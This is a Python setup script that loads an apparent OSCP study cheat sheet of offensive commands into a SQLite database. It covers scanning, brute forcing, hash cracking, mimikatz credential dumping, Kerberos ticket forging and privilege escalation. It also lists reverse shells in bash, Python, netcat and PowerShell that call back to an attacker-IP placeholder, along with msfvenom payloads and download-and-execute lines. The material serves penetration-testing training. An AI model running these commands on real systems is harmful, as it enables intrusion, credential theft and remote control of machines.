#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command Database - Setup Script    ##
##############################################
"""
 
import sqlite3
import os
 
DB_PATH = os.path.expanduser("~/.oscp_commands.db")
 
COMMANDS = [
    # ─────────────────────────────────────────────
    # RECON / SCANNING
    # ─────────────────────────────────────────────
    ("nmap", "Full TCP port scan", "nmap -p- --min-rate 5000 -oN full_tcp.txt <IP>", "recon", "nmap,scan,tcp"),
    ("nmap", "Top ports + version + scripts", "nmap -sC -sV -p <PORTS> -oN nmap_detailed.txt <IP>", "recon", "nmap,scan,version"),
    ("nmap", "UDP scan top 100", "nmap -sU --top-ports 100 -oN udp_scan.txt <IP>", "recon", "nmap,udp,scan"),
    ("nmap", "Vuln script scan", "nmap -sC -sV -p <PORT> --script vuln <IP> -oN vuln_scan.txt", "recon", "nmap,vuln,scripts"),
    ("nmap", "OS detection", "nmap -O <IP>", "recon", "nmap,os,detection"),
    ("rustscan", "Fast port scan then nmap", "rustscan -a <IP> -- -sC -sV", "recon", "rustscan,scan,fast"),
    ("rustscan", "Specific port verify", "rustscan -a <IP> -p <PORT> -- -sV --open", "recon", "rustscan,port,verify"),
    ("whatweb", "Web fingerprinting", "whatweb -a 3 http://<IP>:<PORT> --log-verbose=whatweb.txt", "recon", "web,fingerprint,whatweb"),
    ("nikto", "Web vulnerability scan", "nikto -h http://<IP>:<PORT> -o nikto.txt", "recon", "web,nikto,vuln"),
    ("enum4linux", "Full SMB/LDAP enum", "enum4linux -a <IP>", "recon", "smb,ldap,enum4linux"),
    ("enum4linux-ng", "Full SMB/LDAP enum (new)", "enum4linux-ng -A <IP>", "recon", "smb,ldap,enum"),
    ("smbclient", "List SMB shares", "smbclient -L //<IP> -N", "recon", "smb,shares,smbclient"),
    ("smbclient", "Connect to share", "smbclient //<IP>/<SHARE> -N", "recon", "smb,connect,smbclient"),
    ("smbmap", "SMB share permissions", "smbmap -H <IP>", "recon", "smb,permissions,smbmap"),
    ("smbmap", "SMB with credentials", "smbmap -H <IP> -u <USER> -p <PASS>", "recon", "smb,auth,smbmap"),
    ("crackmapexec", "SMB enum", "crackmapexec smb <IP>", "recon", "smb,cme,crackmapexec"),
    ("crackmapexec", "SMB spray password", "crackmapexec smb <IP> -u users.txt -p <PASS> --continue-on-success", "recon", "smb,spray,cme"),
    ("crackmapexec", "WinRM auth check", "crackmapexec winrm <IP> -u <USER> -p <PASS>", "recon", "winrm,cme,auth"),
    ("ldapsearch", "LDAP anonymous enum", "ldapsearch -x -H ldap://<IP> -b 'dc=<DOMAIN>,dc=<TLD>'", "recon", "ldap,enum,anonymous"),
    ("ldapsearch", "LDAP auth enum", "ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DOMAIN>,dc=<TLD>'", "recon", "ldap,auth,enum"),
    ("snmpwalk", "SNMP walk community string", "snmpwalk -c public -v1 <IP>", "recon", "snmp,walk,recon"),
    ("onesixtyone", "SNMP community string brute", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>", "recon", "snmp,brute,community"),
    ("dig", "DNS zone transfer", "dig axfr @<IP> <DOMAIN>", "recon", "dns,zone,transfer"),
    ("dnsrecon", "DNS recon", "dnsrecon -d <DOMAIN> -t std", "recon", "dns,recon"),
    ("fierce", "DNS brute force", "fierce --domain <DOMAIN>", "recon", "dns,brute,fierce"),
 
    # ─────────────────────────────────────────────
    # WEB
    # ─────────────────────────────────────────────
    ("gobuster", "Directory bust", "gobuster dir -u http://<IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -o gobuster.txt", "web", "gobuster,dir,web"),
    ("gobuster", "Vhost fuzzing", "gobuster vhost -u http://<DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain", "web", "gobuster,vhost,subdomain"),
    ("gobuster", "DNS subdomain", "gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "web", "gobuster,dns,subdomain"),
    ("feroxbuster", "Recursive dir bust", "feroxbuster -u http://<IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak --depth 3 -o ferox.txt", "web", "ferox,dir,recursive"),
    ("ffuf", "Directory fuzzing", "ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404", "web", "ffuf,dir,fuzz"),
    ("ffuf", "Vhost fuzzing with baseline", "ffuf -u http://<IP> -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <BASELINE_SIZE>", "web", "ffuf,vhost,fuzz"),
    ("ffuf", "File extension fuzzing", "ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak,.conf,.log,.xml,.json -fc 404", "web", "ffuf,extension,fuzz"),
    ("ffuf", "POST parameter fuzz", "ffuf -u http://<IP>/login -X POST -d 'username=FUZZ&password=test' -w usernames.txt -fc 401", "web", "ffuf,post,param"),
    ("wfuzz", "Parameter fuzzing", "wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://<IP>/FUZZ", "web", "wfuzz,fuzz,param"),
    ("curl", "Basic GET request", "curl -v http://<IP>:<PORT>/", "web", "curl,get,web"),
    ("curl", "POST request with data", "curl -X POST http://<IP>/login -d 'user=admin&pass=admin' -v", "web", "curl,post,web"),
    ("curl", "Follow redirects with cookies", "curl -L -c cookies.txt -b cookies.txt http://<IP>/", "web", "curl,cookies,redirect"),
    ("sqlmap", "Basic SQL injection test", "sqlmap -u 'http://<IP>/page?id=1' --batch --dbs", "web", "sqlmap,sqli,injection"),
    ("sqlmap", "SQLi with POST data", "sqlmap -u 'http://<IP>/login' --data='user=admin&pass=admin' --batch --dbs", "web", "sqlmap,post,sqli"),
    ("sqlmap", "SQLi dump table", "sqlmap -u 'http://<IP>/page?id=1' -D <DB> -T <TABLE> --dump --batch", "web", "sqlmap,dump,sqli"),
 
    # ─────────────────────────────────────────────
    # PASSWORD ATTACKS
    # ─────────────────────────────────────────────
    ("hashcat", "MD5 crack", "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt", "passwords", "hashcat,md5,crack"),
    ("hashcat", "SHA1 crack", "hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt", "passwords", "hashcat,sha1,crack"),
    ("hashcat", "SHA256 crack", "hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt", "passwords", "hashcat,sha256,crack"),
    ("hashcat", "SHA256 salted crack", "hashcat -m 1410 'hash:salt' /usr/share/wordlists/rockyou.txt", "passwords", "hashcat,sha256,salt"),
    ("hashcat", "NTLM crack", "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt", "passwords", "hashcat,ntlm,crack,windows"),
    ("hashcat", "NetNTLMv2 crack", "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt", "passwords", "hashcat,netntlmv2,crack"),
    ("hashcat", "bcrypt crack", "hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt", "passwords", "hashcat,bcrypt,crack"),
    ("hashcat", "Crack with rules", "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "passwords", "hashcat,rules,crack"),
    ("hashcat", "Show cracked", "hashcat -m 0 hash.txt --show", "passwords", "hashcat,show,cracked"),
    ("john", "Auto detect and crack", "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt", "passwords", "john,crack,auto"),
    ("john", "Show cracked passwords", "john hash.txt --show", "passwords", "john,show,cracked"),
    ("john", "SSH key crack", "ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt", "passwords", "john,ssh,crack"),
    ("john", "ZIP crack", "zip2john file.zip > zip.hash && john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt", "passwords", "john,zip,crack"),
    ("hydra", "SSH brute force", "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<IP>", "passwords", "hydra,ssh,brute"),
    ("hydra", "HTTP POST brute force", "hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", "passwords", "hydra,http,brute"),
    ("hydra", "FTP brute force", "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<IP>", "passwords", "hydra,ftp,brute"),
    ("hydra", "SMB brute force", "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smb://<IP>", "passwords", "hydra,smb,brute"),
    ("hashid", "Identify hash type", "hashid '<HASH>'", "passwords", "hashid,identify,hash"),
    ("hash-identifier", "Identify hash type (alt)", "hash-identifier '<HASH>'", "passwords", "hash-identifier,identify"),
 
    # ─────────────────────────────────────────────
    # IMPACKET
    # ─────────────────────────────────────────────
    ("impacket", "psexec - remote shell", "impacket-psexec <DOMAIN>/<USER>:<PASS>@<IP>", "impacket", "impacket,psexec,shell,windows"),
    ("impacket", "smbexec - remote shell", "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<IP>", "impacket", "impacket,smbexec,shell"),
    ("impacket", "wmiexec - remote shell", "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>", "impacket", "impacket,wmiexec,shell"),
    ("impacket", "secretsdump - dump hashes", "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>", "impacket", "impacket,secretsdump,hashes,dump"),
    ("impacket", "secretsdump local SAM", "impacket-secretsdump -sam SAM -system SYSTEM LOCAL", "impacket", "impacket,secretsdump,sam,local"),
    ("impacket", "GetTGT - request TGT", "impacket-getTGT <DOMAIN>/<USER>:<PASS>", "impacket", "impacket,kerberos,tgt"),
    ("impacket", "GetST - request service ticket", "impacket-getST -spn <SPN> <DOMAIN>/<USER>:<PASS>", "impacket", "impacket,kerberos,service,ticket"),
    ("impacket", "GetNPUsers - AS-REP roasting", "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt", "impacket", "impacket,asrep,roast,kerberos"),
    ("impacket", "GetUserSPNs - Kerberoasting", "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -outputfile kerb.txt", "impacket", "impacket,kerberoast,spn,kerberos"),
    ("impacket", "smbserver - host SMB share", "impacket-smbserver share . -smb2support", "impacket", "impacket,smbserver,share,transfer"),
    ("impacket", "ntlmrelayx - NTLM relay", "impacket-ntlmrelayx -tf targets.txt -smb2support", "impacket", "impacket,ntlmrelay,relay"),
    ("impacket", "lookupsid - SID enumeration", "impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<IP>", "impacket", "impacket,sid,enum"),
    ("impacket", "rpcdump - RPC endpoint dump", "impacket-rpcdump @<IP>", "impacket", "impacket,rpc,dump"),
    ("impacket", "dcomexec - DCOM shell", "impacket-dcomexec <DOMAIN>/<USER>:<PASS>@<IP>", "impacket", "impacket,dcom,shell"),
    ("impacket", "atexec - scheduled task exec", "impacket-atexec <DOMAIN>/<USER>:<PASS>@<IP> <COMMAND>", "impacket", "impacket,atexec,task"),
    ("impacket", "ticketer - forge silver ticket", "impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN> <USER>", "impacket", "impacket,silver,ticket,forge"),
 
    # ─────────────────────────────────────────────
    # LINUX PRIVESC
    # ─────────────────────────────────────────────
    ("linpeas", "Run linpeas", "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", "privesc-linux", "linpeas,privesc,linux"),
    ("linpeas", "Run linpeas from HTTP server", "wget http://<KALI_IP>:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.txt", "privesc-linux", "linpeas,privesc,linux"),
    ("sudo", "Check sudo permissions", "sudo -l", "privesc-linux", "sudo,privesc,linux"),
    ("suid", "Find SUID binaries", "find / -perm -4000 2>/dev/null", "privesc-linux", "suid,privesc,linux"),
    ("capabilities", "Find capabilities", "getcap -r / 2>/dev/null", "privesc-linux", "capabilities,privesc,linux"),
    ("cron", "Check cron jobs", "cat /etc/crontab && ls /etc/cron.d/ && crontab -l 2>/dev/null", "privesc-linux", "cron,privesc,linux"),
    ("writable", "Find world-writable files", "find / -writable -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null", "privesc-linux", "writable,privesc,linux"),
    ("passwd", "Check /etc/passwd for weak perms", "ls -la /etc/passwd /etc/shadow /etc/sudoers", "privesc-linux", "passwd,shadow,privesc"),
    ("pspy", "Monitor processes without root", "wget http://<KALI_IP>:8080/pspy64 && chmod +x pspy64 && ./pspy64", "privesc-linux", "pspy,process,monitor"),
    ("lxd", "LXD container escape", "lxc init alpine privesc -c security.privileged=true && lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true && lxc start privesc && lxc exec privesc /bin/sh", "privesc-linux", "lxd,container,escape"),
    ("docker", "Docker group escape", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "privesc-linux", "docker,container,escape"),
    ("nfs", "Check NFS mounts no_root_squash", "cat /etc/exports && showmount -e <IP>", "privesc-linux", "nfs,mount,privesc"),
    ("path", "PATH hijacking", "export PATH=/tmp:$PATH && echo '/bin/bash' > /tmp/<BINARY> && chmod +x /tmp/<BINARY>", "privesc-linux", "path,hijack,privesc"),
 
    # ─────────────────────────────────────────────
    # WINDOWS PRIVESC
    # ─────────────────────────────────────────────
    ("winpeas", "Run winpeas", ".\\winPEASx64.exe | tee winpeas.txt", "privesc-windows", "winpeas,privesc,windows"),
    ("winpeas", "Transfer and run winpeas", "certutil -urlcache -f http://<KALI_IP>:8080/winPEASx64.exe winpeas.exe && .\\winpeas.exe", "privesc-windows", "winpeas,transfer,windows"),
    ("powershell", "Check user privs", "whoami /priv", "privesc-windows", "powershell,privs,windows"),
    ("powershell", "Check local admins", "net localgroup administrators", "privesc-windows", "powershell,admins,windows"),
    ("powershell", "Find unquoted service paths", "wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'", "privesc-windows", "unquoted,service,privesc"),
    ("powershell", "Check service permissions", "accesschk.exe -uwcqv * /accepteula", "privesc-windows", "service,permissions,privesc"),
    ("powershell", "AlwaysInstallElevated check", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "privesc-windows", "msi,elevated,privesc"),
    ("powershell", "Find passwords in registry", "reg query HKLM /f password /t REG_SZ /s", "privesc-windows", "registry,password,privesc"),
    ("powershell", "Scheduled tasks", "schtasks /query /fo LIST /v | findstr /i 'task\\|run\\|status'", "privesc-windows", "schtasks,scheduled,privesc"),
    ("msfvenom", "Windows reverse shell exe", "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe", "privesc-windows", "msfvenom,payload,windows"),
    ("msfvenom", "Windows MSI payload", "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi", "privesc-windows", "msfvenom,msi,windows"),
    ("printspoofer", "PrintSpoofer SeImpersonate", ".\\PrintSpoofer.exe -i -c cmd", "privesc-windows", "printspoofer,seimpersonate,privesc"),
    ("godpotato", "GodPotato SeImpersonate", ".\\GodPotato.exe -cmd 'cmd /c whoami'", "privesc-windows", "godpotato,seimpersonate,privesc"),
    ("juicypotato", "JuicyPotato SeImpersonate", ".\\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}", "privesc-windows", "juicypotato,seimpersonate,privesc"),
 
    # ─────────────────────────────────────────────
    # ACTIVE DIRECTORY
    # ─────────────────────────────────────────────
    ("bloodhound", "Run SharpHound collector", ".\\SharpHound.exe -c All --outputdirectory C:\\temp\\", "ad", "bloodhound,sharphound,ad"),
    ("bloodhound", "Run bloodhound-python", "bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <IP> -c All", "ad", "bloodhound,python,ad"),
    ("evil-winrm", "Connect with password", "evil-winrm -i <IP> -u <USER> -p <PASS>", "ad", "evil-winrm,winrm,connect"),
    ("evil-winrm", "Connect with hash", "evil-winrm -i <IP> -u <USER> -H <HASH>", "ad", "evil-winrm,pth,hash"),
    ("evil-winrm", "Connect with SSL", "evil-winrm -i <IP> -u <USER> -p <PASS> -S", "ad", "evil-winrm,ssl,connect"),
    ("mimikatz", "Dump credentials", "sekurlsa::logonpasswords", "ad", "mimikatz,dump,credentials"),
    ("mimikatz", "Pass the hash", "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe", "ad", "mimikatz,pth,hash"),
    ("mimikatz", "Dump SAM", "lsadump::sam", "ad", "mimikatz,sam,dump"),
    ("mimikatz", "Golden ticket", "kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /id:500", "ad", "mimikatz,golden,ticket,kerberos"),
    ("mimikatz", "DCSync attack", "lsadump::dcsync /domain:<DOMAIN> /user:Administrator", "ad", "mimikatz,dcsync,ad"),
    ("kerbrute", "User enumeration", "kerbrute userenum --dc <IP> -d <DOMAIN> users.txt", "ad", "kerbrute,enum,users,kerberos"),
    ("kerbrute", "Password spray", "kerbrute passwordspray --dc <IP> -d <DOMAIN> users.txt <PASS>", "ad", "kerbrute,spray,kerberos"),
    ("responder", "LLMNR/NBT-NS poisoning", "responder -I <INTERFACE> -rdwv", "ad", "responder,llmnr,poison,ntlm"),
    ("crackmapexec", "Pass the hash SMB", "crackmapexec smb <IP> -u <USER> -H <HASH>", "ad", "cme,pth,hash,smb"),
    ("crackmapexec", "Dump SAM remotely", "crackmapexec smb <IP> -u <USER> -p <PASS> --sam", "ad", "cme,sam,dump"),
    ("crackmapexec", "Execute command", "crackmapexec smb <IP> -u <USER> -p <PASS> -x 'whoami'", "ad", "cme,exec,command"),
 
    # ─────────────────────────────────────────────
    # SHELLS & TRANSFERS
    # ─────────────────────────────────────────────
    ("shell", "Bash reverse shell", "bash -c 'bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1'", "shells", "bash,reverse,shell"),
    ("shell", "Python3 reverse shell", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<KALI_IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'", "shells", "python,reverse,shell"),
    ("shell", "mkfifo reverse shell", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <KALI_IP> <PORT> >/tmp/f", "shells", "mkfifo,nc,reverse,shell"),
    ("shell", "PowerShell reverse shell", "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<KALI_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", "shells", "powershell,reverse,shell,windows"),
    ("shell", "Stabilize shell (Linux)", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm", "shells", "stabilize,pty,shell"),
    ("shell", "Stabilize shell stty", "# After python3 pty: Ctrl+Z, then: stty raw -echo; fg && reset", "shells", "stabilize,stty,shell"),
    ("shell", "Base64 encode payload", "echo '<COMMAND>' | base64 -w 0", "shells", "base64,encode,payload"),
    ("shell", "Base64 decode and exec", "echo '<BASE64>' | base64 -d | bash", "shells", "base64,decode,exec"),
    ("nc", "Netcat listener", "nc -lvnp <PORT>", "shells", "nc,netcat,listener"),
    ("nc", "Netcat file transfer send", "nc -lvnp <PORT> < file.txt", "shells", "nc,transfer,send"),
    ("nc", "Netcat file transfer receive", "nc <IP> <PORT> > file.txt", "shells", "nc,transfer,receive"),
    ("transfer", "Python HTTP server", "python3 -m http.server 8080", "shells", "python,http,server,transfer"),
    ("transfer", "wget file from Kali", "wget http://<KALI_IP>:8080/<FILE> -O /tmp/<FILE>", "shells", "wget,transfer,download"),
    ("transfer", "curl file from Kali", "curl http://<KALI_IP>:8080/<FILE> -o /tmp/<FILE>", "shells", "curl,transfer,download"),
    ("transfer", "certutil download (Windows)", "certutil -urlcache -f http://<KALI_IP>:8080/<FILE> <FILE>", "shells", "certutil,download,windows"),
    ("transfer", "PowerShell download", "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://<KALI_IP>:8080/<FILE>','C:\\temp\\<FILE>')\"", "shells", "powershell,download,transfer"),
    ("transfer", "SCP file to target", "scp <FILE> <USER>@<IP>:/tmp/<FILE>", "shells", "scp,transfer,upload"),
    ("msfvenom", "Linux reverse shell elf", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf", "shells", "msfvenom,linux,payload"),
    ("msfvenom", "PHP reverse shell", "msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o shell.php", "shells", "msfvenom,php,payload"),
    ("msfvenom", "ASP reverse shell", "msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp", "shells", "msfvenom,asp,payload"),
 
    # ─────────────────────────────────────────────
    # PORT FORWARDING / TUNNELING
    # ─────────────────────────────────────────────
    ("ssh", "Local port forward", "ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<JUMP_HOST>", "tunneling", "ssh,port,forward,tunnel"),
    ("ssh", "Remote port forward", "ssh -R <REMOTE_PORT>:localhost:<LOCAL_PORT> <USER>@<KALI_IP>", "tunneling", "ssh,remote,forward,tunnel"),
    ("ssh", "Dynamic SOCKS proxy", "ssh -D 1080 <USER>@<IP>", "tunneling", "ssh,socks,proxy,tunnel"),
    ("chisel", "Chisel server on Kali", "chisel server -p 8000 --reverse", "tunneling", "chisel,server,tunnel"),
    ("chisel", "Chisel client reverse tunnel", "chisel client <KALI_IP>:8000 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>", "tunneling", "chisel,client,tunnel"),
    ("socat", "Socat port redirect", "socat TCP-LISTEN:<PORT>,fork TCP:<TARGET_IP>:<TARGET_PORT>", "tunneling", "socat,redirect,tunnel"),
    ("ligolo", "Ligolo proxy setup", "# Kali: ./proxy -selfcert -laddr 0.0.0.0:11601 | Target: ./agent -connect <KALI_IP>:11601 -ignore-cert", "tunneling", "ligolo,proxy,tunnel"),
    ("proxychains", "Use proxychains", "proxychains nmap -sT -Pn <IP>", "tunneling", "proxychains,socks,tunnel"),
 
    # ─────────────────────────────────────────────
    # MISC / USEFUL
    # ─────────────────────────────────────────────
    ("misc", "Find files by name", "find / -name '<FILENAME>' 2>/dev/null", "misc", "find,files,search"),
    ("misc", "Find readable files by user", "find / -user <USER> -readable 2>/dev/null", "misc", "find,readable,user"),
    ("misc", "Find SUID files", "find / -perm -4000 2>/dev/null", "misc", "find,suid,perms"),
    ("misc", "Check open ports locally", "ss -tlnp", "misc", "ss,ports,local"),
    ("misc", "Check running processes", "ps aux", "misc", "ps,processes,running"),
    ("misc", "Grep recursive for keyword", "grep -r '<KEYWORD>' / 2>/dev/null", "misc", "grep,recursive,search"),
    ("misc", "Base64 encode string", "echo -n '<STRING>' | base64", "misc", "base64,encode,string"),
    ("misc", "Base64 decode string", "echo '<BASE64>' | base64 -d", "misc", "base64,decode,string"),
    ("misc", "Generate SHA256 hash", "echo -n '<STRING>' | sha256sum", "misc", "sha256,hash,generate"),
    ("misc", "Generate MD5 hash", "echo -n '<STRING>' | md5sum", "misc", "md5,hash,generate"),
    ("misc", "Generate password hash openssl", "openssl passwd -1 <PASSWORD>", "misc", "openssl,password,hash"),
    ("misc", "Check OS and kernel", "uname -a && cat /etc/os-release", "misc", "uname,kernel,os"),
    ("misc", "Check network interfaces", "ip a", "misc", "ip,network,interfaces"),
    ("misc", "Check /etc/hosts", "cat /etc/hosts", "misc", "hosts,network,dns"),
    ("misc", "Add to /etc/hosts", "echo '<IP> <HOSTNAME>' >> /etc/hosts", "misc", "hosts,add,dns"),
    ("misc", "Update hosts file sed", "sed -i 's/<OLD_IP>/<NEW_IP>/g' /etc/hosts", "misc", "hosts,update,sed"),
    ("misc", "Tcpdump capture", "tcpdump -i <INTERFACE> -w capture.pcap", "misc", "tcpdump,capture,network"),
    ("misc", "Get tun0 IP", "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1", "misc", "tun0,ip,vpn"),
]
 
 
def create_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
 
    c.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tool TEXT NOT NULL,
            description TEXT NOT NULL,
            command TEXT NOT NULL,
            category TEXT NOT NULL,
            tags TEXT NOT NULL
        )
    """)
 
    c.execute("DELETE FROM commands")
 
    c.executemany("""
        INSERT INTO commands (tool, description, command, category, tags)
        VALUES (?, ?, ?, ?, ?)
    """, COMMANDS)
 
    conn.commit()
    conn.close()
    print(f"[+] Database created at {DB_PATH}")
    print(f"[+] Loaded {len(COMMANDS)} commands")
 
 
if __name__ == "__main__":
    create_db()
